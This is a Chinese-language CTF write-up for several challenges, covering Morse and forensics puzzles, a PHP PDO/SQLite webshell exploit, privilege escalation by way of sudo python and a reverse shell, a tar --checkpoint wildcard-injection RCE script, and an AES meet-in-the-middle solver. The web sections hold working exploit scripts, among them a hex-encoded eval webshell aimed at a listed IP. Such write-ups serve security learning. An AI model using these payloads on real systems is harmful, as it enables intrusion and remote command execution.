
### 猜谜

1. 一个看作/，一个看作.，一个看作-
2. morse code

### 進撃の巨人

1. 使用 VercCrypt 打开加密卷，使用 key.jpg 作为密钥文件。
2. 提取 hiddenflag.pcapng，用 WireShark 文件-导出对象-HTTP... 导出 encrypted_new_year.txt。
3. base64 解码。

### 新年快乐，红包拿来

4. 访问 /src/
5. {{1e39}}

### 尖头曼的礼物

#### 0. robots.txt

访问得知去看 hint.txt，然后得知要源码。

#### 1. 检查服务器配置错误

如果服务器配置错误，可能会直接返回 PHP 源码。

http://<目标>/index.phps

.phps 是 PHP 源码文件的扩展名，如果配置错误，可能会直接显示源码。

```php
<?php
// $dsn = "mysql:host=localhost;dbname=test";
$dsn = $_POST['dsn'];
$username = $_POST['username'];
$password = $_POST['password'];
$query = $_POST['query'];

if (isset($dsn) && isset($username) && isset($password) && isset($query)) {

    $pdo = new PDO($dsn, $username, $password);

    $stmt = $pdo->query($query);
    $stmt->execute();
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);

    foreach ($result as $row) {
        echo "id: " . $row['id'] . " name: " . $row['name'] ;
    }
}
// 其实这台电脑上没有 mysql 
```

#### 2. [通过写 SQLite 来 getshell](https://www.cnblogs.com/Ygnniinngg/articles/18678070)

dsn 均设为 sqlite:pre6.php

```sql
CREATE TABLE users (name TEXT);
INSERT INTO users (name) VALUES (x'3c3f7068702066696c655f7075745f636f6e74656e747328226d756d612e706870222c20223c3f706870206576616c285c245f504f53545b636d645d293f3e22293b203f3e');
```

上述 payload 改动过，先访问 pre6.php 触发解析，再向 muma.php POST cmd 参数。

```python
import requests
url = "http://119.27.182.25:11111/index.php"
payload = {
    "dsn": "sqlite:pre6.php",
    "username": " ",
    "password": " ",
    "query": '''CREATE TABLE users (name TEXT);'''
}
requests.post(url, data=payload)
payload["query"] = '''INSERT INTO users (name) VALUES (x'3c3f7068702066696c655f7075745f636f6e74656e747328226d756d612e706870222c20223c3f706870206576616c285c245f504f53545b636d645d293f3e22293b203f3e');'''
requests.post(url, data=payload)
requests.get("http://119.27.182.25:11111/pre6.php")
```

你可以使用上述脚本来快速部署一句话木马。

#### 3. shell 之后

`cat /hint.txt` 得到提示如下：

如果你攻破了我的防线，那我问你，现在有个 flag 在 /root 下，你应该如何获得他？ 给你一个一串神秘字符串：asdflkj

`cat /etc/passwd` 得知有个用户叫 sxrhhh。

设置反向 shell，之后用反向 shell 连上，然后 su sxrhhh 并输入密码 asdflkj 可以到这个用户。

在切换到这个用户之后，我们使用 `sudo -l` 并输入密码得知 sudo 只能以 root 权限执行 python 命令，因此我们 `sudo python` 进入 Python 交互式界面，然后 `import os; os.system("sh")` 进入 root shell，然后 `cat /root/flag`。

注：反向 shell 我用的是 https://github.com/tdragon6/Supershell，跑在自己的 Azure 服务器（不然 docker pull 不下来）上，然后我的反向 shell 本质上应该是木马，用蚁剑传到靶机上的，用别的应该也行。

### 🐍年大吉

```python
import requests
import io

TARGET = "http://127.0.0.1:12562"

requests.post(f"{TARGET}/delete")

malicious_files = [
    ("test1", "cat /flag > test2"),
    ("--checkpoint=1", "dummy"),
    ('--checkpoint-action=exec="sh test1"', "dummy")
]

for filename, content in malicious_files:
    files = {'file': (filename, io.BytesIO(content.encode('utf-8')))}
    response = requests.post(f"{TARGET}/upload", files=files)
    print(f"Uploaded {filename}: {response.status_code}")

# 触发打包下载（执行命令）
requests.get(f"{TARGET}/download")
```

原理：* 通配符会把文件名当成命令的参数，这时我们用 tar 指令独有的 --checkpoint 设置检查点，并且利用到达检查点时执行的指令来进行 RCE，将命令回显输出到当前目录文件，然后调用下载两次，前一次调用指令，后一次下载回显。

### Before Sunset

```python
from itertools import product
from hashlib import sha256
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from tqdm import tqdm  # 新增进度条库

# 题目数据
note = b'Before_Sunset*xt'
cipher = b'4\xf6\x89\x81:\xd7\xf4\xc4\xad\xb1)\x99\xb1l\xe2\x7f'
enflag = b'\x964\xdcq\xcc\xe9\xde\xfe=\xfb\x08\\\x9e\xe3\xf5\xef^\x9c\x11\xaa\xb8\x97\xe61\x1ee\xe4dV\x0c\x1c\xf7 \xabX]\x92\xd6\xa3\xdegD\xbb\xbd\x98\x90\xeb~'
plaintext = b'happy_newyear!!!'

# 生成所有3字节组合并预计算哈希
print("[1/4] 生成所有可能的密钥组合...")
possible_keys = [bytes(comb) for comb in product(note, repeat=3)]
key_digests = {k: sha256(k).digest() for k in possible_keys}

# 预计算前半部分（key1和key2）
print("[2/4] 预计算前半部分（约需数分钟）...")
forward = {}
for key1 in tqdm(possible_keys, desc="外层循环进度"):  # 添加进度条
    k1 = key_digests[key1]
    c1 = AES.new(k1, AES.MODE_ECB).encrypt(plaintext)
    for key2 in possible_keys:
        k2 = key_digests[key2]
        c2 = AES.new(k2, AES.MODE_ECB).encrypt(c1)
        forward[c2] = (key1, key2)

# 预计算后半部分（key3和key4）
print("[3/4] 预计算后半部分（约需数分钟）...")
backward = {}
for key4 in tqdm(possible_keys, desc="外层循环进度"):  # 添加进度条
    k4 = key_digests[key4]
    c3 = AES.new(k4, AES.MODE_ECB).decrypt(cipher)
    for key3 in possible_keys:
        k3 = key_digests[key3]
        c2_candidate = AES.new(k3, AES.MODE_ECB).decrypt(c3)
        backward[c2_candidate] = (key3, key4)

# 查找中间碰撞
print("[4/4] 查找碰撞并解密flag...")
for c2, (key1, key2) in tqdm(forward.items(), desc="碰撞检测"):
    if c2 in backward:
        key3, key4 = backward[c2]
        keys = [key_digests[key1], key_digests[key2],
                key_digests[key3], key_digests[key4]]
        enkey = sha256(b"".join(keys)).digest()
        flag = unpad(AES.new(enkey, AES.MODE_ECB).decrypt(enflag), AES.block_size)
        print("\nFlag found:", flag.decode())
        exit()

print("No solution found")
```

非常好工作，❤️爱来自 DeepSeek。如下是 Prompt

```plaintext
6. 不开深度思考：（源码省略）如上是 CTF 的 Crypto 题目源码，请帮我写出反推 flag 的脚本
7. 开启深度思考：优化算法，目前这个算法时间过长，不可能实现
8. 开启深度思考：能加个进度显示吗，另外说下PyPy怎么安装
```